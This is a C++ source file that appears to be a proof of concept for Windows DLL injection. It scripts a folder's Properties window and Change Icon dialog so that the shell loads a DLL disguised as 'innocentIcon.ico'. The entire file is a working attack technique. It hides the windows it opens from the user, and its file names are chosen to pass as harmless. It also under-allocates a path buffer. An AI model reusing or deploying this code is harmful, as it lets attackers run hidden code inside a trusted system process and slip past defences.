#include <Windows.h>

// For SHObjectProperties
#include <shlobj_core.h>

// For StrStrW & PathCombineW
#include <Shlwapi.h> 
#pragma comment(lib, "Shlwapi.lib")

// Can be anything, choose something distinct and long.
const LPCWSTR dirName = L"a9e91106-3c84-4ac8-942a-2913445aa715";
const int dirNameLen = wcslen(dirName);

HWND props = NULL;
HWND iconDialog = NULL;

BOOL CALLBACK getInjectionWindow(HWND hWnd, LPARAM lparam) {

    int titleLen = GetWindowTextLengthW(hWnd);

    // Optimization
    if (titleLen <= dirNameLen)
        return TRUE;

    WCHAR* titleBuf = new WCHAR[titleLen];
    GetWindowTextW(hWnd, titleBuf, titleLen);

    BOOL result = TRUE;

    // When EnumWinodws is called for the first time, it finds the properties window.
    // When it is called for the second time, it finds the change icon dialog window.
    if (hWnd != props && StrStrW(titleBuf, dirName) != NULL) {
        result = FALSE;
        if (props != NULL)
            iconDialog = hWnd;
        else
            props = hWnd;
    }
    delete[] titleBuf;
    return result;
}

void openChangeIcons() {
    // Creates a directory in appdata\temp.
    WCHAR tmpPath[MAX_PATH] = { 0 };
    GetTempPath(MAX_PATH, tmpPath);

    WCHAR* fullPath = new WCHAR[dirNameLen + wcslen(tmpPath)];
    PathCombineW(fullPath, tmpPath, dirName);

    CreateDirectoryW(fullPath, NULL);

    // Opens the properties window of the created directory.
    SHObjectProperties(NULL, SHOP_FILEPATH, fullPath, NULL);

    // Retrieves the handle of the properties window and hides it.
    while (props == NULL) {
        EnumWindows(getInjectionWindow, NULL);
    }
    CloseWindow(props);

    // Retireves the handle of the SysTabControl32 window.
    HWND tabs = GetWindow(GetWindow(props, GW_CHILD), GW_HWNDLAST);

    // Switch to the customize tab.
    SendMessage(tabs, TCM_SETCURFOCUS, 4, 0);

    // Retrieves the handle of the Change Icon button.
    HWND changeIcon = GetWindow(GetWindow(GetWindow(props, GW_CHILD), GW_CHILD), GW_HWNDLAST);

    // The Change Icon button is being clicked. 
    // This has to be executed in a separate thread because it returns after the Change Icon dialog has been closed.
    SendMessageCallback(changeIcon, BM_CLICK, 0, 0, 0, 0);

    // Remove direcotry.
    RemoveDirectory(fullPath);
}

int main() {

    // Opens the Change Icon dialog.
    openChangeIcons();

    // Uses EnumWindows in second stage to find the change icon window.
    while (iconDialog == NULL) {
        EnumWindows(getInjectionWindow, NULL);
    }
    // Hides the change icon window.
    CloseWindow(iconDialog);

    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    PathRemoveFileSpec(exePath);

    WCHAR dllPath[MAX_PATH];
    PathCombineW(dllPath, exePath, L"innocentIcon.ico");

    // Retrives the handle to the input field and puts in the path of the DLL (in this case with an .ico extension)
    HWND edit = GetWindow(GetWindow(iconDialog, GW_CHILD), GW_HWNDNEXT);
    SendMessage(edit, WM_SETTEXT, 0, (LPARAM)dllPath);

    // Clicks the ok button.
    HWND ok = GetWindow(GetWindow(GetWindow(iconDialog, GW_CHILD), GW_HWNDLAST), GW_HWNDPREV);
    SendMessage(ok, BM_CLICK, 0, 0);
}
